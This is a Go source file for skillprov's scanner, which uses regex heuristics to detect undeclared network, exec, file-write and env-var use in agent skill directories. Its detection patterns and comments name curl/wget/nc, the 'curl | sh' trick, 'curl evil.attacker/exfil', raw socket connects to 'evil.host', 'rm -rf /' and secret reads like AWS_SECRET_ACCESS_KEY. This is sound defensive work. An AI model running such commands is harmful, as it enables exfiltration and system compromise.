// Package scan statically inspects a skill directory. It pulls declared
// capabilities out of SKILL.md frontmatter and detects observed capability
// signals (network / fs-write / exec / env) across the skill's scripts and
// source files using lightweight, language-agnostic heuristics.
//
// The heuristics are deliberately conservative: they over-detect rather than
// under-detect, because a missed signal in the scanner becomes an undeclared
// capability that slips past verification. False positives are the author's to
// declare away; false negatives would defeat the whole point.
package scan

import (
	"bufio"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/SuperMarioYL/skillprov/internal/manifest"
)

// Capability is one of the four capability classes skillprov tracks.
type Capability string

const (
	CapNet      Capability = "net"
	CapFSWrite  Capability = "fs-write"
	CapExec     Capability = "exec"
	CapEnv      Capability = "env"
)

// Evidence records a single observed capability hit: where it was seen and the
// matched snippet. This is what makes a REJECTED message human-readable.
type Evidence struct {
	Capability Capability
	File       string
	Line       int
	Snippet    string
}

// HostHit records a single observed network host with the file:line where it was
// seen. It is what lets verify name an off-allowlist host in a REJECTED message
// rather than just flagging the coarse net class.
type HostHit struct {
	Host string
	File string
	Line int
}

// EnvHit records a single observed environment-variable read with its name and
// the file:line where it was seen, so verify can name a secret env var pulled
// outside the declared allowlist.
type EnvHit struct {
	Name string
	File string
	Line int
}

// ExecHit records a single observed shell-out with the command NAME (argv[0],
// e.g. "curl", "git", "sh") and the file:line where it was seen, so verify can
// name an off-allowlist command rather than just flagging the coarse exec class.
type ExecHit struct {
	Command string
	File    string
	Line    int
}

// Result is the full output of scanning a skill directory.
type Result struct {
	SkillName    string
	SkillVersion string
	Entry        string

	// Declared is the capability set parsed from SKILL.md frontmatter.
	Declared map[Capability]bool
	// DeclaredHosts / DeclaredEnv / DeclaredExec carry the finer-grained
	// declarations when the author listed specific hosts, environment variables,
	// or exec commands.
	DeclaredHosts []string
	DeclaredEnv   []string
	DeclaredExec  []string

	// Observed is the capability set the static scan actually found, with the
	// evidence that triggered each.
	Observed map[Capability][]Evidence

	// Files is the relative path of every scanned source/script file.
	Files []string

	// observedHosts accumulates hostnames seen in network evidence.
	observedHosts []string
	// observedHostHits keeps the per-host file:line evidence so verify can name
	// where an off-allowlist host was reached.
	observedHostHits []HostHit
	// observedEnvHits keeps every observed env-var read (name + file:line) so
	// verify can diff against the declared env allowlist at value granularity.
	observedEnvHits []EnvHit
	// observedExecHits keeps every observed shell-out (command name + file:line)
	// so verify can diff against the declared exec command allowlist at value
	// granularity.
	observedExecHits []ExecHit
}

// skillFrontmatter is the subset of SKILL.md frontmatter skillprov reads.
type skillFrontmatter struct {
	Name         string `yaml:"name"`
	Version      string `yaml:"version"`
	Entry        string `yaml:"entry"`
	AllowedTools string `yaml:"allowed-tools"`
	// Capabilities is skillprov's optional explicit declaration block. Authors
	// who want precise control over the manifest use this rather than relying on
	// allowed-tools inference.
	Capabilities *declaredCaps `yaml:"capabilities"`
}

type declaredCaps struct {
	Net      *bool    `yaml:"net"`
	FSWrite  *bool    `yaml:"fs-write"`
	Exec     *bool    `yaml:"exec"`
	Env      *bool    `yaml:"env"`
	Hosts    []string `yaml:"hosts"`
	EnvVars  []string `yaml:"env-vars"`
	Commands []string `yaml:"commands"`
}

// scannable file extensions. SKILL.md itself is scanned for inline code too.
var scanExt = map[string]bool{
	".sh": true, ".bash": true, ".zsh": true,
	".py": true, ".js": true, ".ts": true, ".mjs": true, ".cjs": true,
	".go": true, ".rb": true, ".pl": true, ".php": true,
	".md": true, "": true, // "" covers extensionless scripts (e.g. ./run)
}

// signature is one capability detector.
type signature struct {
	cap Capability
	re  *regexp.Regexp
}

// signatures are the static heuristics. Kept intentionally broad.
var signatures = []signature{
	// network
	{CapNet, regexp.MustCompile(`(?i)\bhttps?://`)},
	{CapNet, regexp.MustCompile(`(?i)\b(curl|wget)\b`)},
	{CapNet, regexp.MustCompile(`(?i)\b(requests|urllib|httplib|http\.client|httpx|aiohttp)\b`)},
	{CapNet, regexp.MustCompile(`(?i)\bfetch\s*\(`)},
	{CapNet, regexp.MustCompile(`(?i)\b(net/http|http\.Get|http\.Post|http\.NewRequest)\b`)},
	{CapNet, regexp.MustCompile(`(?i)\bsocket\.(socket|create_connection)\b`)},
	{CapNet, regexp.MustCompile(`(?i)\bnet\.Dial\b`)},
	// socket-style connect tuple: s.connect(("host", port)) — the Python/JS
	// idiom for opening a raw connection with no URL anywhere on the line. The
	// line is a real network call, so it must fire the net class for the host
	// feed below to have anything to diff (v0.7, fix-socket-dial-host-capture).
	{CapNet, regexp.MustCompile(`(?i)\bconnect\s*\(\s*\(\s*['"]`)},
	// fs-write
	{CapFSWrite, regexp.MustCompile(`(?i)\bopen\s*\([^)]*['"][wa]\+?['"]`)},
	{CapFSWrite, regexp.MustCompile(`(?i)\b(os\.Create|os\.WriteFile|ioutil\.WriteFile)\b`)},
	{CapFSWrite, regexp.MustCompile(`(?i)\bWriteFile\b`)},
	{CapFSWrite, regexp.MustCompile(`(?i)\bfs\.(write|writeFile|appendFile|createWriteStream)\b`)},
	{CapFSWrite, regexp.MustCompile(`(?i)\bFile\.(write|open)\b`)},
	{CapFSWrite, regexp.MustCompile(`>>?\s*['"]?/`)},      // shell redirect to an absolute path
	{CapFSWrite, regexp.MustCompile(`>>?\s*['"]?\$[A-Za-z_{]`)}, // redirect into a $VAR-rooted path (e.g. > "$HOME/x")
	{CapFSWrite, regexp.MustCompile(`(?i)\btee\b`)},
	// exec
	{CapExec, regexp.MustCompile(`(?i)\b(subprocess|os\.system|popen|check_output|check_call)\b`)},
	{CapExec, regexp.MustCompile(`(?i)\bexec(\.Command|Sync|File)?\b`)},
	{CapExec, regexp.MustCompile(`(?i)\bsystem\s*\(`)},
	{CapExec, regexp.MustCompile(`(?i)\b(child_process|spawn|execFile)\b`)},
	{CapExec, regexp.MustCompile("`[^`]+`")}, // shell backtick command substitution
	{CapExec, regexp.MustCompile(`\$\([^)]+\)`)}, // shell $(...) command substitution
	// env
	{CapEnv, regexp.MustCompile(`(?i)\b(getenv|os\.environ|process\.env|ENV\[)`)},
	{CapEnv, regexp.MustCompile(`(?i)\bos\.Getenv\b`)},
	{CapEnv, regexp.MustCompile(`\$\{?[A-Z_][A-Z0-9_]*\}?`)}, // $VAR / ${VAR} in shell
}

// hostRe extracts hostnames from URLs to enrich network evidence.
var hostRe = regexp.MustCompile(`(?i)https?://([a-z0-9.\-]+)`)

// schemelessHostRe captures a bare dotted hostname passed as the URL argument to
// curl/wget when the token carries no http(s):// scheme. curl and wget implicitly
// treat a schemeless arg as http://, so `curl evil.attacker/exfil` is a real
// network call — but hostRe above only matches https?:// hosts, so v0.4 recorded
// ZERO host hits for such a line. A skill declaring a finite host allowlist then
// verified GREEN even though it reached an off-allowlist host, defeating the m4
// host-allowlist enforcement. Feeding this capture through observedHost lets
// checkHostAllowlist diff it. The flag cluster skips option tokens between the
// command and the host arg: `-{1,2}[A-Za-z][\w-]*` admits short flags (`-s`,
// `-fsSL`), combined short flags ending in a non-letter (`-qO-`, wget's
// quiet+write-to-stdout), and GNU long options (`--silent`, `--output`). The
// v0.5 cluster `(?:-[A-Za-z]+\s+)*` only matched single-dash short letter flags,
// so `curl --silent evil.host` and `wget -qO- evil.host` recorded ZERO host hits
// and evaded the allowlist — the very evasion the v0.5 fix targeted (v0.6,
// m13_schemeless_host_long_option). A scheme-prefixed arg never matches here:
// `https://` interrupts the dotted-host pattern before a TLD, so all existing
// scheme-prefixed fixtures are unaffected. (An option that TAKES A VALUE, e.g.
// `curl -o file host`, cannot be statically resolved across curl/wget's full
// option surface and is left to the conservative over-detect path.)
var schemelessHostRe = regexp.MustCompile(`(?i)\b(?:curl|wget)\b\s+(?:-{1,2}[A-Za-z][\w-]*\s+)*([a-z0-9][a-z0-9.\-]*\.[a-z]{2,})\b`)

// connectHostRe captures the host of a network call that carries no URL: the
// first element of a socket connect tuple (s.connect(("evil.host", 443)),
// socket.create_connection(("evil.host", 80))) and the address argument of a
// dial (net.Dial("tcp", "evil.host:443")). The CapNet signatures fire for these
// APIs, but hostRe (https?:// only) and schemelessHostRe (curl/wget only) never
// extracted the host, so a skill with a finite host allowlist verified GREEN
// while connecting to an off-allowlist host over a raw socket — the same
// value-level evasion family the schemeless-host fixes closed for curl/wget
// (v0.7, fix-socket-dial-host-capture). Two capture groups, one per form.
var connectHostRe = regexp.MustCompile(`(?i)\b(?:create_connection|connect)\s*\(\s*\(\s*['"]([a-z0-9][a-z0-9.\-]*\.[a-z]{2,})['"]\s*[,)]|\bdial\w*\s*\(\s*['"][a-z]+['"]\s*,\s*['"]([a-z0-9][a-z0-9.\-]*\.[a-z]{2,})(?::\d+)?['"]`)

// envNameRe captures the bare variable NAME from a shell $VAR / ${VAR} / ${VAR:-x}
// reference. The leading capture group is just the name, so a default-value
// expansion like ${AWS_SECRET_ACCESS_KEY:-} still yields AWS_SECRET_ACCESS_KEY.
var envNameRe = regexp.MustCompile(`\$\{?([A-Z_][A-Z0-9_]*)`)

// getenvNameRe captures the literal env-var name passed to a getenv-style call in
// Python / Go / Node / Ruby, e.g. os.getenv("AWS_SECRET_ACCESS_KEY"),
// os.Getenv("X"), process.env.X, ENV["X"]. This lets the env allowlist diff name
// the variable even outside shell scripts. The first alternative also covers the
// Python method-call form os.environ.get("X") / os.environ.get('X', default): the
// bracket/getenv alternative below requires an open `(` or `[` immediately after
// the receiver, so the `.get(...)` form — Python's most common env-with-default
// idiom — yielded no name and a secret read via it slipped past the env allowlist
// diff (v0.6, m11_env_get_name_extraction).
var getenvNameRe = regexp.MustCompile(`(?i)(?:getenv|environ)\.get\s*\(\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]|(?:getenv|environ)\s*[\(\[]\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]|process\.env\.([A-Za-z_][A-Za-z0-9_]*)|ENV\[\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]`)

// execCmdSubstRe pulls the command portion out of a shell command substitution —
// backticks (`...`) or $(...) — so the leading command word can be extracted.
var execCmdSubstRe = regexp.MustCompile("`([^`]+)`|\\$\\(([^)]+)\\)")

// execApiArgRe pulls the first string argument out of an exec-style API call in
// Python / Go / Node / Ruby, e.g. subprocess.run("curl ..."),
// subprocess.run(["curl", ...]), os.system("rm -rf /"), exec.Command("git", ...),
// child_process.spawn("sh", ...). The command NAME is the leading token of that
// argument. Two capture groups cover the quoted-string and list-first-element forms.
var execApiArgRe = regexp.MustCompile(`(?i)(?:subprocess\.\w+|os\.system|popen|check_output|check_call|exec\.command|execfile|execsync|system|spawn|spawnsync|execfilesync|child_process\.\w+)\s*\(\s*\[?\s*['"]([^'"]+)['"]`)

// shellCmdLeadRe matches a bare command invocation at the start of a shell line
// (after optional indentation and common prefixes like `sudo`/`exec`/`command`),
// capturing the command word. This catches `curl https://x | sh` style lines that
// do not use a command-substitution or an API wrapper.
var shellCmdLeadRe = regexp.MustCompile(`^\s*(?:sudo\s+|exec\s+|command\s+|nohup\s+|time\s+|env\s+[A-Z_]+=\S+\s+)*([A-Za-z_][\w.\-/]*)`)

// pipedCmdRe captures the command word immediately following a shell pipe `|`, so
// `curl https://x | sh` records BOTH `curl` and `sh`. The classic remote-exec
// supply-chain trick (`curl ... | sh`) is exactly what value-level exec must catch.
var pipedCmdRe = regexp.MustCompile(`\|\s*(?:sudo\s+)?([A-Za-z_][\w.\-/]*)`)

// shellBuiltinEnv are shell-provided variables that are not skill-author secrets
// and must not be treated as an undeclared env capability when matched by the
// broad $VAR heuristic. They are universally present in any shell environment.
// `_` is included because it is the shell's last-argument special parameter,
// not an author-declared env var: envNameRe matches `$_` since `_` is in its
// leading char class `[A-Z_]`, so without this entry a skill that legitimately
// uses `$_` with a finite env allowlist was false-REJECTED (v0.5,
// fix-underscore-shell-var-env-falsepositive).
var shellBuiltinEnv = map[string]bool{
	"HOME": true, "PATH": true, "PWD": true, "OLDPWD": true, "SHELL": true,
	"USER": true, "LOGNAME": true, "HOSTNAME": true, "TERM": true, "LANG": true,
	"LC_ALL": true, "TMPDIR": true, "TMP": true, "TEMP": true, "IFS": true,
	"PS1": true, "PS2": true, "RANDOM": true, "SECONDS": true, "LINENO": true,
	"PPID": true, "UID": true, "EUID": true, "BASH": true, "BASH_VERSION": true,
	"SHLVL": true, "FUNCNAME": true, "BASH_SOURCE": true, "OPTARG": true,
	"OPTIND": true, "REPLY": true, "_": true,
}

// Scan walks dir, parses SKILL.md, and detects observed capabilities.
func Scan(dir string) (*Result, error) {
	r := &Result{
		Declared: map[Capability]bool{},
		Observed: map[Capability][]Evidence{},
	}

	if err := r.parseSkillMD(dir); err != nil {
		return nil, err
	}

	err := filepath.WalkDir(dir, func(path string, e fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if e.IsDir() {
			return nil
		}
		rel, err := filepath.Rel(dir, path)
		if err != nil {
			return err
		}
		rel = filepath.ToSlash(rel)
		// Never scan skillprov's own emitted artifacts.
		switch rel {
		case manifest.ManifestFile, manifest.SBOMFile, "bundle.sig":
			return nil
		}
		if !scanExt[strings.ToLower(filepath.Ext(rel))] {
			return nil
		}
		r.Files = append(r.Files, rel)
		return r.scanFile(path, rel)
	})
	if err != nil {
		return nil, err
	}
	sort.Strings(r.Files)
	return r, nil
}

// parseSkillMD reads SKILL.md frontmatter into the declared capability set.
func (r *Result) parseSkillMD(dir string) error {
	b, err := os.ReadFile(filepath.Join(dir, "SKILL.md"))
	if err != nil {
		return err
	}
	fm := extractFrontmatter(b)
	var f skillFrontmatter
	if len(fm) > 0 {
		_ = yaml.Unmarshal(fm, &f) // a malformed frontmatter just means nothing declared
	}
	r.SkillName = f.Name
	r.SkillVersion = f.Version
	if r.SkillVersion == "" {
		r.SkillVersion = "0.0.0"
	}
	r.Entry = f.Entry
	if r.Entry == "" {
		r.Entry = "SKILL.md"
	}

	// 1) Explicit capabilities block wins when present. A class set explicitly
	//    (to true OR false) is "locked": the coarse allowed-tools inference in
	//    step 2 must not override an author's deliberate `false` declaration —
	//    that is exactly the negative declaration verify needs to catch a lie.
	locked := map[Capability]bool{}
	if c := f.Capabilities; c != nil {
		lockExplicit(r.Declared, locked, CapNet, c.Net)
		lockExplicit(r.Declared, locked, CapFSWrite, c.FSWrite)
		lockExplicit(r.Declared, locked, CapExec, c.Exec)
		lockExplicit(r.Declared, locked, CapEnv, c.Env)
		r.DeclaredHosts = manifest.SortStrings(c.Hosts)
		r.DeclaredEnv = manifest.SortStrings(c.EnvVars)
		r.DeclaredExec = manifest.SortStrings(c.Commands)
		if len(c.Hosts) > 0 {
			r.Declared[CapNet] = true
			locked[CapNet] = true
		}
		if len(c.EnvVars) > 0 {
			r.Declared[CapEnv] = true
			locked[CapEnv] = true
		}
		if len(c.Commands) > 0 {
			r.Declared[CapExec] = true
			locked[CapExec] = true
		}
	}

	// 2) allowed-tools is inferred as a coarse capability hint for classes the
	//    author did NOT pin explicitly. A skill that lists Bash-style tools is
	//    declaring exec; WebFetch declares net; Write/Edit declares fs-write.
	inferFromAllowedTools(r.Declared, locked, f.AllowedTools)
	return nil
}

// lockExplicit records an explicit (true or false) declaration and marks the
// class as locked so inference can't change it.
func lockExplicit(decl map[Capability]bool, locked map[Capability]bool, c Capability, v *bool) {
	if v == nil {
		return
	}
	decl[c] = *v
	locked[c] = true
}

// inferFromAllowedTools maps harness tool names to capability classes, but never
// touches a class the author locked with an explicit capabilities declaration.
func inferFromAllowedTools(decl map[Capability]bool, locked map[Capability]bool, allowed string) {
	a := strings.ToLower(allowed)
	if a == "" {
		return
	}
	set := func(c Capability) {
		if !locked[c] {
			decl[c] = true
		}
	}
	if strings.Contains(a, "bash") || strings.Contains(a, "shell") || strings.Contains(a, "exec") {
		set(CapExec)
	}
	if strings.Contains(a, "webfetch") || strings.Contains(a, "websearch") ||
		strings.Contains(a, "fetch") || strings.Contains(a, "http") {
		set(CapNet)
	}
	if strings.Contains(a, "write") || strings.Contains(a, "edit") {
		set(CapFSWrite)
	}
}

// scanFile applies every signature to each line of a file, recording evidence.
//
// Markdown is handled specially: a SKILL.md (or any .md) is mostly prose plus a
// YAML frontmatter declaration block, neither of which is executable. Matching
// capability signals against prose would produce misleading evidence (e.g. the
// word "curl" in a sentence). For Markdown we therefore scan ONLY the lines
// inside fenced ``` code blocks, and skip the leading --- frontmatter entirely.
func (r *Result) scanFile(path, rel string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	isMarkdown := strings.EqualFold(filepath.Ext(rel), ".md")

	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	lineNo := 0
	inFrontmatter := false
	frontmatterDone := false
	inCodeFence := false
	fenceMarker := "" // the delimiter that opened the open fence ("```" or "~~~")

	for sc.Scan() {
		lineNo++
		line := sc.Text()
		trimmed := strings.TrimSpace(line)

		if isMarkdown {
			// Detect and skip a leading YAML frontmatter block.
			if lineNo == 1 && trimmed == "---" {
				inFrontmatter = true
				continue
			}
			if inFrontmatter {
				if trimmed == "---" {
					inFrontmatter = false
					frontmatterDone = true
				}
				continue
			}
			_ = frontmatterDone
			// Toggle on fenced code blocks; only scan lines inside one. Both
			// CommonMark fence delimiters open a block: the backtick fence
			// (```) and the tilde fence (~~~) (v0.6, m12_markdown_tilde_fence_scan).
			// A fence is closed only by its OWN delimiter kind — CommonMark's
			// close rule — so a ~~~ line inside a ```-fenced block is CONTENT,
			// and a ``` line inside a ~~~-fenced block is content. v0.6 shared
			// one toggle for both delimiters, letting the opposite marker end
			// the block early and hide every code line after it from the
			// scanner (v0.7, fix-markdown-fence-close-delimiter).
			if !inCodeFence {
				if strings.HasPrefix(trimmed, "```") || strings.HasPrefix(trimmed, "~~~") {
					inCodeFence = true
					fenceMarker = trimmed[:3]
					continue
				}
			} else if strings.HasPrefix(trimmed, fenceMarker) {
				inCodeFence = false
				fenceMarker = ""
				continue
			}
			if !inCodeFence {
				continue
			}
		}

		// Skip obvious full-line comments to cut false positives, but keep
		// scanning shell `#!` shebangs and inline code. `//` covers C/Go/JS,
		// `* ` covers C-block continuation lines, and `#` covers shell / Python
		// / Ruby / PHP full-line comments — so a doc comment like
		// `# attacks use: curl | sh` no longer surfaces `sh` as an observed exec
		// command (v0.4, m10). Markdown `#` headings never reach here: prose
		// lines are skipped earlier by the `if !inCodeFence { continue }` gate,
		// so this only affects real `#` comments in source files and shell
		// blocks inside a fenced code block.
		if strings.HasPrefix(trimmed, "//") || strings.HasPrefix(trimmed, "* ") || strings.HasPrefix(trimmed, "#") {
			continue
		}

		snippet := strings.TrimSpace(line)
		if len(snippet) > 120 {
			snippet = snippet[:117] + "..."
		}

		for _, sig := range signatures {
			loc := sig.re.FindStringIndex(line)
			if loc == nil {
				continue
			}
			r.Observed[sig.cap] = append(r.Observed[sig.cap], Evidence{
				Capability: sig.cap,
				File:       rel,
				Line:       lineNo,
				Snippet:    snippet,
			})
			if sig.cap == CapNet {
				for _, h := range hostRe.FindAllStringSubmatch(line, -1) {
					r.observedHost(h[1], rel, lineNo)
				}
				// Also capture a schemeless curl/wget host arg (e.g. `curl evil.host`)
				// so the host allowlist diff cannot be evaded by dropping the scheme.
				for _, h := range schemelessHostRe.FindAllStringSubmatch(line, -1) {
					r.observedHost(h[1], rel, lineNo)
				}
				// And the host of a URL-less socket connect tuple or dial address
				// (s.connect(("evil.host", 443)), net.Dial("tcp", "evil.host:443")),
				// so the allowlist cannot be evaded by switching from curl to the
				// socket API (v0.7, fix-socket-dial-host-capture).
				for _, h := range connectHostRe.FindAllStringSubmatch(line, -1) {
					for _, g := range h[1:] {
						if g != "" {
							r.observedHost(g, rel, lineNo)
						}
					}
				}
			}
			if sig.cap == CapEnv {
				for _, name := range envNamesIn(line) {
					r.observedEnv(name, rel, lineNo)
				}
			}
		}

		// Exec command extraction runs once per line, independent of which class
		// signatures fired: a bare `curl ... | sh` shell-out fires only the CapNet
		// signature, yet it IS an exec of `curl` and `sh`. Recording it here (and
		// registering CapExec evidence when a command is found) is what lets the
		// value-level exec allowlist diff catch the classic `curl | sh` trick that
		// the coarse exec signatures alone would miss. (v0.3, m7)
		for _, cmd := range execNamesIn(line, isMarkdown) {
			before := len(r.observedExecHits)
			r.observedExec(cmd, rel, lineNo)
			// Only register class-level exec evidence when the hit was actually
			// recorded (i.e. not a filtered builtin), so ObservedCaps stays honest.
			if len(r.observedExecHits) > before {
				r.Observed[CapExec] = append(r.Observed[CapExec], Evidence{
					Capability: CapExec,
					File:       rel,
					Line:       lineNo,
					Snippet:    snippet,
				})
			}
		}
	}
	return sc.Err()
}

func (r *Result) observedHost(h, file string, line int) {
	h = strings.ToLower(strings.TrimSuffix(h, "."))
	if h == "" {
		return
	}
	if !containsStr(r.observedHosts, h) {
		r.observedHosts = append(r.observedHosts, h)
	}
	r.observedHostHits = append(r.observedHostHits, HostHit{Host: h, File: file, Line: line})
}

func (r *Result) observedEnv(name, file string, line int) {
	if name == "" || shellBuiltinEnv[name] {
		return
	}
	r.observedEnvHits = append(r.observedEnvHits, EnvHit{Name: name, File: file, Line: line})
}

func (r *Result) observedExec(cmd, file string, line int) {
	cmd = normalizeCommand(cmd)
	if cmd == "" || shellExecBuiltins[cmd] {
		return
	}
	r.observedExecHits = append(r.observedExecHits, ExecHit{Command: cmd, File: file, Line: line})
}

// shellExecBuiltins are shell keywords / builtins and pure language constructs that
// the broad exec heuristics may surface but that are NOT external commands a skill
// is shelling out to. Treating them as commands would produce noise REJECTs (e.g.
// `if`, `for`, `echo`, `set`), so they are filtered out of the exec value-level diff.
// Author-meaningful external binaries (curl, git, sh, python, rm, ...) are not here.
var shellExecBuiltins = map[string]bool{
	"if": true, "then": true, "else": true, "elif": true, "fi": true,
	"for": true, "while": true, "until": true, "do": true, "done": true,
	"case": true, "esac": true, "in": true, "function": true, "return": true,
	"set": true, "unset": true, "export": true, "local": true, "readonly": true,
	"declare": true, "shift": true, "break": true, "continue": true, "trap": true,
	"echo": true, "printf": true, "print": true, "true": true, "false": true,
	"test": true, "cd": true, "pwd": true, "read": true, "let": true, "eval": true,
	"source": true, "alias": true, "type": true, "wait": true, "exit": true,
	"and": true, "or": true, "not": true, "def": true, "import": true, "from": true,
	"const": true, "let_": true, "var": true, "require": true,
}

// execNamesIn returns the distinct external command names invoked on a single
// line. It pulls from three forms: API-style exec calls (subprocess.run("curl ..."),
// exec.Command("git", ...)), shell command substitutions (`...` / $(...)), and bare
// shell command lines (`curl https://x | sh` records both `curl` and `sh`). The
// command NAME is always the leading token of the invocation, basename-normalized.
//
// For Markdown we only ever reach here on lines already confirmed to be inside a
// fenced code block (scanFile gates that), so isMarkdown only tunes the bare-line
// heuristic: prose-y fenced blocks still flow through the same extractor.
func execNamesIn(line string, isMarkdown bool) []string {
	var out []string
	add := func(n string) {
		n = normalizeCommand(n)
		if n != "" && !shellExecBuiltins[n] && !containsStr(out, n) {
			out = append(out, n)
		}
	}

	// 1) exec-style API calls: first string/list-first argument's leading token.
	for _, m := range execApiArgRe.FindAllStringSubmatch(line, -1) {
		add(leadingToken(m[1]))
	}
	// 2) command substitutions: `cmd ...` and $(cmd ...).
	for _, m := range execCmdSubstRe.FindAllStringSubmatch(line, -1) {
		for _, g := range m[1:] {
			if g != "" {
				add(leadingToken(g))
			}
		}
	}
	// 3) piped commands: every `| cmd` records the downstream command (catches `... | sh`).
	for _, m := range pipedCmdRe.FindAllStringSubmatch(line, -1) {
		add(m[1])
	}
	// 4) bare shell command line: the leading command word of the line itself. Only
	//    apply to lines that look like shell commands (avoid matching code in .py/.go
	//    where the leading token is a language identifier, not a shell-out — those are
	//    covered by the API form above). A line that already produced an API/subst hit
	//    still benefits from this for the `curl ... | sh` left-hand side.
	if loc := shellCmdLeadRe.FindStringSubmatch(line); loc != nil && looksShelly(line) {
		add(loc[1])
	}
	return out
}

// leadingToken returns the first whitespace-delimited token of s (the command word
// in a command string like "curl -s https://x").
func leadingToken(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	if i := strings.IndexAny(s, " \t"); i >= 0 {
		return s[:i]
	}
	return s
}

// normalizeCommand reduces a command token to its bare program name: strips any
// path ("/usr/bin/curl" -> "curl"), surrounding quotes, and a leading "./".
func normalizeCommand(c string) string {
	c = strings.Trim(strings.TrimSpace(c), `"'`)
	c = strings.TrimPrefix(c, "./")
	if i := strings.LastIndexByte(c, '/'); i >= 0 {
		c = c[i+1:]
	}
	// Drop a trailing argument glued by a redirect/semicolon if any slipped through.
	if i := strings.IndexAny(c, ";&|<>()"); i >= 0 {
		c = c[:i]
	}
	return strings.TrimSpace(c)
}

// NormalizeCommandName reduces an arbitrary command entry (declared or observed)
// to its bare program name: it takes the leading token of the string, then strips
// any path and quoting. Exported so the verify package can normalize a declared
// exec allowlist the exact same way the scanner normalizes observed commands, so
// the value-level diff compares like with like.
func NormalizeCommandName(c string) string {
	return normalizeCommand(leadingToken(strings.TrimSpace(c)))
}

// looksShelly is a conservative guard for the bare-leading-command heuristic: it
// fires only for lines that read like shell command invocations (a known external
// binary at the head, or a pipe/redirect present), so we don't mis-tag a Python/Go
// identifier line. The API-style and command-substitution forms remain language-agnostic.
func looksShelly(line string) bool {
	t := strings.TrimSpace(line)
	if t == "" || strings.HasPrefix(t, "#") {
		return false
	}
	if strings.ContainsAny(t, "|") || hostRe.MatchString(t) {
		return true
	}
	lead := normalizeCommand(leadingToken(t))
	return commonShellBins[lead]
}

// commonShellBins is a small allowlist of external binaries that, when leading a
// line, confidently mark it as a shell command invocation for looksShelly. It is
// NOT the policy allowlist (that is author-declared) — only a detector heuristic.
var commonShellBins = map[string]bool{
	"curl": true, "wget": true, "sh": true, "bash": true, "zsh": true,
	"git": true, "rm": true, "mv": true, "cp": true, "cat": true, "chmod": true,
	"chown": true, "tar": true, "unzip": true, "ssh": true, "scp": true,
	"python": true, "python3": true, "node": true, "npm": true, "npx": true,
	"pip": true, "pip3": true, "go": true, "ruby": true, "perl": true, "make": true,
	"docker": true, "kubectl": true, "sudo": true, "nc": true, "ncat": true,
	"dd": true, "mkfs": true, "openssl": true, "base64": true, "eval": true,
}

// envNamesIn returns the distinct env-var names referenced on a single line,
// pulling both shell $VAR/${VAR} forms and getenv-style API calls.
func envNamesIn(line string) []string {
	var out []string
	add := func(n string) {
		if n != "" && !containsStr(out, n) {
			out = append(out, n)
		}
	}
	for _, m := range envNameRe.FindAllStringSubmatch(line, -1) {
		add(m[1])
	}
	for _, m := range getenvNameRe.FindAllStringSubmatch(line, -1) {
		for _, g := range m[1:] {
			if g != "" {
				add(g)
			}
		}
	}
	return out
}

func containsStr(s []string, v string) bool {
	for _, x := range s {
		if x == v {
			return true
		}
	}
	return false
}

// ObservedHosts returns the network hosts found during the scan.
func (r *Result) ObservedHosts() []string {
	return manifest.SortStrings(r.observedHosts)
}

// ObservedHostHits returns every observed network host with its file:line
// evidence, in scan order.
func (r *Result) ObservedHostHits() []HostHit {
	return r.observedHostHits
}

// ObservedEnvHits returns every observed env-var read with its name and file:line
// evidence, in scan order.
func (r *Result) ObservedEnvHits() []EnvHit {
	return r.observedEnvHits
}

// ObservedExecHits returns every observed shell-out with its command name and
// file:line evidence, in scan order.
func (r *Result) ObservedExecHits() []ExecHit {
	return r.observedExecHits
}

// RecordExecHitForTest appends a normalized observed exec hit. It exists so tests
// in sibling packages (e.g. verify) can stage a Result with known commands without
// writing a full skill directory to disk. It applies the same normalization +
// builtin filtering the real scanner uses.
func (r *Result) RecordExecHitForTest(cmd, file string, line int) {
	r.observedExec(cmd, file, line)
}

// ObservedCommands returns the distinct external command names found during the
// scan, sorted. Empty when no exec capability was observed.
func (r *Result) ObservedCommands() []string {
	var names []string
	for _, h := range r.observedExecHits {
		if !containsStr(names, h.Command) {
			names = append(names, h.Command)
		}
	}
	return manifest.SortStrings(names)
}

// DeclaredCapabilities builds a manifest.Capabilities block from what the skill
// DECLARED in its SKILL.md frontmatter. This is what `skillprov manifest` writes:
// the author's stated permission set, which `verify` later diffs against the
// observed scan. When the author left a class undeclared, the corresponding
// field is empty (and network resolves to "none").
func (r *Result) DeclaredCapabilities() manifest.Capabilities {
	// exec/env are initialized to empty (non-nil) slices so the emitted JSON is
	// always a [] for those required schema fields, never a null.
	c := manifest.Capabilities{Exec: []string{}, Env: []string{}}

	if r.Declared[CapFSWrite] {
		c.Filesystem.Write = []string{"**"}
	}
	c.Filesystem.Read = []string{"**"} // reads are not a tracked risk class

	if r.Declared[CapNet] {
		hosts := r.DeclaredHosts
		if len(hosts) == 0 {
			hosts = []string{"*"}
		}
		c.Network = manifest.Network{Hosts: hosts}
	} else {
		c.Network = manifest.Network{None: true}
	}

	if r.Declared[CapExec] {
		exec := r.DeclaredExec
		if len(exec) == 0 {
			exec = []string{"*"}
		}
		c.Exec = exec
	}
	if r.Declared[CapEnv] {
		env := r.DeclaredEnv
		if len(env) == 0 {
			env = []string{"*"}
		}
		c.Env = env
	}
	return c
}

// ObservedCapabilities builds a manifest.Capabilities block reflecting what the
// static scan actually FOUND. `skillprov manifest` shows this to the author so
// they can confirm/declare it.
func (r *Result) ObservedCapabilities() manifest.Capabilities {
	c := manifest.Capabilities{}
	if len(r.Observed[CapFSWrite]) > 0 {
		c.Filesystem.Write = []string{"**"}
	}
	if len(r.Observed[CapNet]) > 0 {
		hosts := r.ObservedHosts()
		if len(hosts) == 0 {
			hosts = []string{"*"}
		}
		c.Network = manifest.Network{Hosts: hosts}
	} else {
		c.Network = manifest.Network{None: true}
	}
	if len(r.Observed[CapExec]) > 0 {
		cmds := r.ObservedCommands()
		if len(cmds) == 0 {
			cmds = []string{"*"}
		}
		c.Exec = cmds
	}
	if len(r.Observed[CapEnv]) > 0 {
		c.Env = []string{"*"}
	}
	return c
}

